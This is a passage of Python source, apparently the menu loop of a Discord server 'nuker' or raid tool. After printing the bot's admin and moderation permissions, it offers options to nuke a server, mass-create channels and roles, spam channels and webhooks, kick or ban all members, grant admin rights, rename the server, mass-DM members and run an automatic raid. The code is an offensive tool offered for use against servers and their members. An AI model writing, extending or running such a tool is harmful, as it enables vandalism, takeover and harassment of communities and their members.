        print(Colorate.Color(Colors.green, "\n" + "=" * 60))
        print(Colorate.Color(Colors.yellow, "[+] Bot Permissions:"))
        print(Colorate.Color(Colors.green, "=" * 60))
        print(
            Colorate.Color(
                Colors.cyan,
                f"  • Admin: {Colorate.Color(Colors.green if permissions.administrator else Colors.red, str(permissions.administrator))}",
            )
        )
        print(
            Colorate.Color(
                Colors.cyan,
                f"  • Manage Channels: {Colorate.Color(Colors.green if permissions.manage_channels else Colors.red, str(permissions.manage_channels))}",
            )
        )
        print(
            Colorate.Color(
                Colors.cyan,
                f"  • Manage Roles: {Colorate.Color(Colors.green if permissions.manage_roles else Colors.red, str(permissions.manage_roles))}",
            )
        )
        print(
            Colorate.Color(
                Colors.cyan,
                f"  • Ban Members: {Colorate.Color(Colors.green if permissions.ban_members else Colors.red, str(permissions.ban_members))}",
            )
        )
        print(
            Colorate.Color(
                Colors.cyan,
                f"  • Kick Members: {Colorate.Color(Colors.green if permissions.kick_members else Colors.red, str(permissions.kick_members))}",
            )
        )
        print(Colorate.Color(Colors.green, "=" * 60))

        while True:
            show_menu()
            choice = input(Colorate.Color(Colors.blue, "\n[?] Choose: ")).strip()

            if choice == "00":
                print(Colorate.Color(Colors.red, "[!] Exiting..."))
                await bot.close()
                break

            elif choice == "0":
                print(Colorate.Color(Colors.yellow, "\n[!] Available Servers:"))
                for i, guild in enumerate(bot.guilds):
                    print(Colorate.Color(Colors.cyan, f"    {i + 1}. {guild.name}"))
                guild_input = input(
                    Colorate.Color(Colors.blue, "[?] Enter number or ID: ")
                ).strip()
                try:
                    if guild_input.isdigit() and int(guild_input) <= len(bot.guilds):
                        current_guild = bot.guilds[int(guild_input) - 1]
                    else:
                        current_guild = bot.get_guild(int(guild_input))
                    if current_guild:
                        print(
                            Colorate.Color(
                                Colors.green, f"[+] Switched to: {current_guild.name}"
                            )
                        )
                    else:
                        print(Colorate.Color(Colors.red, "[!] Not found!"))
                except:
                    print(Colorate.Color(Colors.red, "[!] Invalid!"))

            elif choice == "1":
                await nuke_command(current_guild)
            elif choice == "2":
                num = input(Colorate.Color(Colors.blue, "[?] Number of channels: "))
                ch_type = input(Colorate.Color(Colors.blue, "[?] Type (text/voice): "))
                await create_channels_command(current_guild, int(num), ch_type)
            elif choice == "3":
                num = input(Colorate.Color(Colors.blue, "[?] Messages per channel: "))
                msg = input(Colorate.Color(Colors.blue, "[?] Content (or 'embed'): "))
                await spam_channels_command(current_guild, int(num), msg, False)
            elif choice == "4":
                num = input(Colorate.Color(Colors.blue, "[?] Messages per webhook: "))
                msg = input(Colorate.Color(Colors.blue, "[?] Content: "))
                await webhook_spam_command(current_guild, int(num), msg, False)
            elif choice == "5":
                await kick_all_command(current_guild)
            elif choice == "6":
                await ban_all_command(current_guild)
            elif choice == "7":
                num = input(Colorate.Color(Colors.blue, "[?] Number of roles: "))
                await create_roles_command(current_guild, int(num))
            elif choice == "8":
                uid = input(
                    Colorate.Color(Colors.blue, "[?] User ID (empty for all): ")
                )
                await get_admin_command(current_guild, int(uid) if uid else None)
            elif choice == "9":
                await change_server_command(
                    current_guild,
                    config.SERVER_CONFIG["new_name"],
                    config.SERVER_CONFIG["new_icon"],
                    config.SERVER_CONFIG["new_description"],
                )
            elif choice == "10":
                msg = input(Colorate.Color(Colors.blue, "[?] DM message: "))
                await dm_all_command(current_guild, msg)
            elif choice == "11":
                await auto_raid_command(current_guild)
            else:
                print(Colorate.Color(Colors.red, "[!] Invalid choice!"))

            input(Colorate.Color(Colors.blue, "\nPress Enter..."))

    except Exception as e:
        print(Colorate.Color(Colors.red, f"[!] Error: {e}"))
        await bot.close()


try:
    bot.run(bot_token)
except Exception as e:
    print(Colorate.Color(Colors.red, f"[!] Error: {e}"))
